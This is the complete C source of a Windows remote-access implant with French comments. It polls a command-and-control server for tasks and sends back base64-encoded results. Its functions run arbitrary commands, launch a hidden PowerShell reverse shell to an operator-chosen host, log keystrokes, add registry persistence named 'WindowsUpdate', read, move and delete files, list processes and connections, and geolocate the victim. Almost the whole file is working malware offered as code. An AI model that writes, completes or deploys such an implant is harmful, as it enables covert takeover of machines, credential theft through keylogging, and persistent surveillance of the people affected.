#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <tlhelp32.h>  // Pour CreateToolhelp32Snapshot, Process32First, etc.

#pragma comment(lib, "Ws2_32.lib")

// Variables globales
static FILE *keylogger_file = NULL;
static int keylogger_running = 0;
static HANDLE keylogger_thread = NULL;

// Callback pour curl
size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
    size_t realsize = size * nmemb;
    strncat_s(buffer, 8192, (char *)contents, realsize);
    return realsize;
}

// Nettoyer une chaîne
void clean_string(char *str) {
    for (size_t i = 0; str[i] != '\0'; i++) {
        if (str[i] < 32 || str[i] > 126) {
            str[i] = ' ';
        }
    }
}

// Encoder en base64
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char *base64_encode(const char *input) {
    size_t input_len = strlen(input);
    size_t output_len = 4 * ((input_len + 2) / 3);
    char *encoded = (char *)malloc(output_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_b = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_c = i < input_len ? (unsigned char)input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded[j++] = base64_table[triple & 0x3F];
    }

    if (input_len % 3 == 1) {
        encoded[j - 2] = '=';
        encoded[j - 1] = '=';
    } else if (input_len % 3 == 2) {
        encoded[j - 1] = '=';
    }
    encoded[j] = '\0';
    return encoded;
}

// Exécuter une commande
char *execute_command(const char *cmd) {
    char buffer[8192] = {0};
    FILE *pipe = _popen(cmd, "r");
    if (!pipe) return strdup("Error: Failed to execute command");

    size_t buffer_len = 0;
    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, pipe)) {
        buffer_len = strlen(buffer);
    }
    _pclose(pipe);
    clean_string(buffer);
    return strdup(buffer);
}

// Lire un fichier
char *read_file(const char *filepath) {
    FILE *fp;
    fopen_s(&fp, filepath, "r");
    if (!fp) return strdup("Error: Failed to open file");

    char buffer[8192] = {0};
    size_t buffer_len = 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        strncat_s(buffer, sizeof(buffer), line, sizeof(buffer) - buffer_len - 1);
        buffer_len = strlen(buffer);
    }
    fclose(fp);
    clean_string(buffer);
    return strdup(buffer);
}

// Lister les processus
char *list_processes() {
    char buffer[8192] = {0};
    size_t offset = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return strdup("Error: Failed to get process list");
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe32)) {
        do {
            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%ws\n", pe32.szExeFile);
        } while (Process32Next(snapshot, &pe32) && offset < sizeof(buffer) - 256);
    }
    CloseHandle(snapshot);
    clean_string(buffer);
    return strdup(buffer);
}

// Lister les sockets
char *list_sockets() {
    char buffer[8192] = {0};
    size_t offset = 0;
    FILE *pipe = _popen("netstat -ano | findstr ESTABLISHED", "r"); // Filtrer uniquement les connexions établies
    if (!pipe) return strdup("Error: Failed to execute netstat");

    // Ajouter un en-tête
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                       "Proto  Local Address          Foreign Address        State\n");

    char line[256];
    while (fgets(line, sizeof(line), pipe)) {
        // Exemple de ligne : "  TCP    192.168.1.10:12345  8.8.8.8:80  ESTABLISHED  1234"
        char proto[10], local[22], foreign[22], state[15];
        if (sscanf(line, " %9s %21s %21s %14s", proto, local, foreign, state) == 4) {
            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                              "%-6s %-22s %-22s %-15s\n", proto, local, foreign, state);
            if (offset >= sizeof(buffer) - 256) break; // Prévenir le débordement
        }
    }
    _pclose(pipe);
    clean_string(buffer);
    return strdup(buffer);
}

// Obtenir la localisation
char *get_location() {
    CURL *curl = curl_easy_init();
    if (!curl) return strdup("Error: Curl initialization failed");

    char buffer[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/json");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) return strdup("Error: Failed to get location");

    struct json_object *parsed_json = json_tokener_parse(buffer);
    if (!parsed_json) return strdup("Error: Failed to parse JSON");

    struct json_object *loc_field, *city_field, *country_field;
    char result[256] = {0};
    const char *loc = "unknown", *city = "unknown", *country = "unknown";

    if (json_object_object_get_ex(parsed_json, "loc", &loc_field))
        loc = json_object_get_string(loc_field);
    if (json_object_object_get_ex(parsed_json, "city", &city_field))
        city = json_object_get_string(city_field);
    if (json_object_object_get_ex(parsed_json, "country", &country_field))
        country = json_object_get_string(country_field);

    snprintf(result, sizeof(result), "Latitude/Longitude: %s (%s, %s)", loc, city, country);
    json_object_put(parsed_json);
    return strdup(result);
}

// Reverse shell Windows
char *send_reverse_shell(const char *lhost, int lport) {
    // Commande PowerShell encodée pour éviter les problèmes d'échappement
    char ps_command[1024];
    snprintf(ps_command, sizeof(ps_command),
             "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$cl = New-Object System.Net.Sockets.TCPClient('%s',%d);$bloblo = $cl.GetStream();[byte[]]$blabla = 0..65535|%%{0};while(($i = $bloblo.Read($blabla, 0, $blabla.Length)) -ne 0){;$dodo = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($blabla,0, $i);$banana = (iex $dodo 2>&1 | Out-String );$banana2 = $banana;$dragon = ([text.encoding]::ASCII).GetBytes($banana2);$bloblo.Write($dragon,0,$dragon.Length);$bloblo.Flush()};$cl.Close()\"",
             lhost, lport);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESTDHANDLES;

    // Lancer PowerShell en mode caché
    if (!CreateProcessA(NULL, ps_command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return strdup("Error: Failed to create PowerShell process");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return strdup("Reverse shell sent");
}

// Thread
DWORD WINAPI keylogger_thread_func(LPVOID lpParam) {
    FILE *file = (FILE *)lpParam;
    while (keylogger_running) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Touche pressée récemment
                char key_str[32];
                // Convertir le code en caractère lisible si possible
                char key_char = (char)MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
                if (key_char && key_char >= 32 && key_char <= 126) {
                    snprintf(key_str, sizeof(key_str), "%c", key_char);
                } else {
                    snprintf(key_str, sizeof(key_str), "[VK_%d]", key);
                }

                if (file) {
                    fputs(key_str, file);
                    fflush(file); // Forcer l’écriture immédiate
                }
                printf("%s", key_str); // Pour debug dans la console
                Sleep(50); // Réduire le délai
            }
        }
        Sleep(10); // Boucle rapide
    }
    if (file) fflush(file); // S’assurer que tout est écrit avant de quitter
    return 0;
}

// Activer/désactiver le keylogger
char *toggle_keylogger(const char *state, const char *filepath) {
    if (!state) return strdup("Error: Keylogger state not specified");

    if (_stricmp(state, "true") == 0 || _stricmp(state, "on") == 0) {
        if (keylogger_running) return strdup("Keylogger already running");

        // Utiliser un chemin absolu si possible
        char full_path[MAX_PATH];
        if (filepath && _stricmp(filepath, "null") != 0) {
            // Si le chemin est relatif, le rendre absolu par rapport au répertoire courant
            if (GetFullPathNameA(filepath, MAX_PATH, full_path, NULL) == 0) {
                return strdup("Error: Failed to resolve file path");
            }
            if (fopen_s(&keylogger_file, full_path, "a") != 0 || !keylogger_file) {
                return strdup("Error: Failed to open output file");
            }
        } else {
            keylogger_file = NULL; // Pas de fichier spécifié
        }

        keylogger_running = 1;
        keylogger_thread = CreateThread(NULL, 0, keylogger_thread_func, keylogger_file, 0, NULL);
        if (!keylogger_thread) {
            keylogger_running = 0;
            if (keylogger_file) fclose(keylogger_file);
            return strdup("Error: Failed to create thread");
        }

        char msg[256];
        snprintf(msg, sizeof(msg), "Keylogger activated%s%s",
                 keylogger_file ? ", writing to " : "",
                 keylogger_file ? full_path : "");
        return strdup(msg);
    }
    else if (_stricmp(state, "false") == 0 || _stricmp(state, "off") == 0) {
        if (!keylogger_running) return strdup("Keylogger already stopped");

        keylogger_running = 0;
        WaitForSingleObject(keylogger_thread, INFINITE);
        CloseHandle(keylogger_thread);
        if (keylogger_file) {
            fclose(keylogger_file);
            keylogger_file = NULL;
        }
        return strdup("Keylogger stopped");
    }
    return strdup("Error: Invalid state (must be 'true'/'false' or 'on'/'off')");
}

// Persistance via registre
char *toggle_persistence(const char *state) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
        return strdup("Error: Failed to open registry key");
    }

    if (_stricmp(state, "true") == 0 || _stricmp(state, "on") == 0) {
        if (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return strdup("Persistence enabled (added to registry)");
        }
    }
    else if (_stricmp(state, "false") == 0 || _stricmp(state, "off") == 0) {
        if (RegDeleteValueA(hKey, "WindowsUpdate") == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return strdup("Persistence disabled (removed from registry)");
        }
    }
    RegCloseKey(hKey);
    return strdup("Error: Invalid persistence state");
}

// Déplacer un fichier
char *move_file(const char *src, const char *dst) {
    if (MoveFileA(src, dst)) return strdup("File moved successfully");
    return strdup("Error: Failed to move file");
}

// Supprimer un fichier
char *remove_file(const char *filepath) {
    if (DeleteFileA(filepath)) return strdup("File deleted successfully");
    return strdup("Error: Failed to delete file");
}

// Fonction DECLARE
int perform_declare(CURL *curl, char *response, char *implant_uid, size_t implant_uid_size, char *username, char *hostname, char *os) {
    char json[8192];
    snprintf(json, sizeof(json), "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}", username, hostname, os);
    printf("DECLARE JSON sent: %s\n", json);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "DECLARE error: %s\n", curl_easy_strerror(res));
        return 0;
    }

    printf("DECLARE response: %s\n", response);

    struct json_object *parsed_json = json_tokener_parse(response);
    if (!parsed_json) {
        fprintf(stderr, "Error: Failed to parse DECLARE JSON response\n");
        return 0;
    }

    struct json_object *ok_field, *uid_field;
    if (json_object_object_get_ex(parsed_json, "OK", &ok_field) &&
        json_object_object_get_ex(ok_field, "UID", &uid_field)) {
        const char *uid = json_object_get_string(uid_field);
        if (uid) {
            strncpy_s(implant_uid, implant_uid_size, uid, implant_uid_size - 1);
            printf("New implant-uid received: %s\n", implant_uid);
            json_object_put(parsed_json);
            return 1;
        }
    }
    json_object_put(parsed_json);
    return 0;
}

int main() {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Error: Curl initialization failed\n");
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

    char response[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    char implant_uid[32] = {0};
    int sleep_time = 5, jitter = 2, not_found_count = 0;

    char username[32], hostname[64], os[32] = "WINDOWS";
    DWORD username_len = sizeof(username);
    GetUserNameA(username, &username_len);
    DWORD hostname_len = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_len);

    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
        fprintf(stderr, "Initial DECLARE failed\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 1;
    }

    while (1) {
        memset(response, 0, sizeof(response));
        char json[8192];
        snprintf(json, sizeof(json), "{\"FETCH\":\"%s\"}", implant_uid);
        printf("FETCH JSON sent: %s\n", json);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "FETCH error: %s\n", curl_easy_strerror(res));
            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
            continue;
        }

        printf("FETCH response: %s\n", response);

        struct json_object *parsed_json = json_tokener_parse(response);
        if (!parsed_json) {
            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
            continue;
        }

        struct json_object *error_field, *task_uid_field, *action_field;
        char *task_uid = NULL, *result = NULL;

        if (json_object_object_get_ex(parsed_json, "error", &error_field)) {
            const char *error_msg = json_object_get_string(error_field);
            printf("FETCH error: %s\n", error_msg);
            if (_stricmp(error_msg, "NotFound") == 0) {
                not_found_count++;
                if (not_found_count >= 50) {
                    printf("Too many NotFound errors, retrying DECLARE...\n");
                    memset(implant_uid, 0, sizeof(implant_uid));
                    memset(response, 0, sizeof(response));
                    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
                        json_object_put(parsed_json);
                        curl_slist_free_all(headers);
                        curl_easy_cleanup(curl);
                        curl_global_cleanup();
                        return 1;
                    }
                    not_found_count = 0;
                }
            }
            json_object_put(parsed_json);
            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
            continue;
        }

        not_found_count = 0;

        if (json_object_object_get_ex(parsed_json, "task_uid", &task_uid_field) &&
            json_object_object_get_ex(parsed_json, "action", &action_field)) {
            task_uid = strdup(json_object_get_string(task_uid_field));

            struct json_object *execve_field, *sleep_field, *locate_field, *revshell_field;
            struct json_object *keylog_field, *persist_field, *cat_field, *mv_field;
            struct json_object *rm_field, *ps_field, *netstat_field;

            if (json_object_object_get_ex(action_field, "EXECVE", &execve_field)) {
                struct json_object *cmd_field, *args_field;
                const char *cmd = NULL, *args = NULL;
                if (json_object_object_get_ex(execve_field, "cmd", &cmd_field))
                    cmd = json_object_get_string(cmd_field);
                if (json_object_object_get_ex(execve_field, "args", &args_field))
                    args = json_object_get_string(args_field);

                char full_cmd[256];
                if (args && _stricmp(args, "null") != 0)
                    snprintf(full_cmd, sizeof(full_cmd), "%s %s", cmd, args);
                else
                    snprintf(full_cmd, sizeof(full_cmd), "%s", cmd);
                result = execute_command(full_cmd);
            }
            else if (json_object_object_get_ex(action_field, "SLEEP", &sleep_field)) {
                struct json_object *seconds_field, *jitter_field;
                if (json_object_object_get_ex(sleep_field, "time", &seconds_field))
                    sleep_time = json_object_get_int(seconds_field);
                if (json_object_object_get_ex(sleep_field, "jitter", &jitter_field))
                    jitter = json_object_get_int(jitter_field);
                else
                    jitter = 0;
                result = strdup("Sleep time updated");
            }
            else if (json_object_object_get_ex(action_field, "LOCATE", &locate_field)) {
                result = get_location();
            }
            else if (json_object_object_get_ex(action_field, "REVSHELL", &revshell_field)) {
                struct json_object *lhost_field, *lport_field;
                const char *lhost = "127.0.0.1";
                int lport = 0;
                if (json_object_object_get_ex(revshell_field, "host", &lhost_field))
                    lhost = json_object_get_string(lhost_field);
                if (json_object_object_get_ex(revshell_field, "port", &lport_field))
                    lport = json_object_get_int(lport_field);
                result = send_reverse_shell(lhost, lport);
            }
            else if (json_object_object_get_ex(action_field, "KEYLOG", &keylog_field)) {
                struct json_object *state_field, *filepath_field;
                const char *state = NULL, *filepath = NULL;
                if (json_object_object_get_ex(keylog_field, "status", &state_field))
                    state = json_object_get_string(state_field);
                if (json_object_object_get_ex(keylog_field, "path", &filepath_field))
                    filepath = json_object_get_string(filepath_field);
                result = toggle_keylogger(state, filepath);
            }
            else if (json_object_object_get_ex(action_field, "PERSIST", &persist_field)) {
                struct json_object *state_field;
                const char *state = NULL;
                if (json_object_object_get_ex(persist_field, "status", &state_field))
                    state = json_object_get_string(state_field);
                result = toggle_persistence(state);
            }
            else if (json_object_object_get_ex(action_field, "CAT", &cat_field)) {
                struct json_object *filepath_field;
                const char *filepath = NULL;
                if (json_object_object_get_ex(cat_field, "path", &filepath_field))
                    filepath = json_object_get_string(filepath_field);
                result = read_file(filepath ? filepath : "null");
            }
            else if (json_object_object_get_ex(action_field, "MV", &mv_field)) {
                struct json_object *src_field, *dst_field;
                const char *src = NULL, *dst = NULL;
                if (json_object_object_get_ex(mv_field, "src", &src_field))
                    src = json_object_get_string(src_field);
                if (json_object_object_get_ex(mv_field, "dst", &dst_field))
                    dst = json_object_get_string(dst_field);
                result = move_file(src ? src : "null", dst ? dst : "null");
            }
            else if (json_object_object_get_ex(action_field, "RM", &rm_field)) {
                struct json_object *filepath_field;
                const char *filepath = NULL;
                if (json_object_object_get_ex(rm_field, "path", &filepath_field))
                    filepath = json_object_get_string(filepath_field);
                result = remove_file(filepath ? filepath : "null");
            }
            else if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
                result = list_processes();
            }
            else if (json_object_object_get_ex(action_field, "NETSTAT", &netstat_field)) {
                result = list_sockets();
            }
            else {
                result = strdup("Error: Unrecognized task");
            }

            if (result) {
                char *encoded_result = base64_encode(result);
                if (encoded_result) {
                    clean_string(encoded_result);
                    memset(json, 0, sizeof(json));
                    snprintf(json, sizeof(json),
                              "{\"RESULT\":{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"%s\"}}",
                              implant_uid, task_uid, encoded_result);
                    printf("RESULT JSON sent: %s\n", json);

                    memset(response, 0, sizeof(response));
                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
                    res = curl_easy_perform(curl);
                    if (res == CURLE_OK) {
                        printf("RESULT response: %s\n", response);
                    }
                    free(encoded_result);
                }
                free(result);
                free(task_uid);
            }
        }
        json_object_put(parsed_json);
        Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
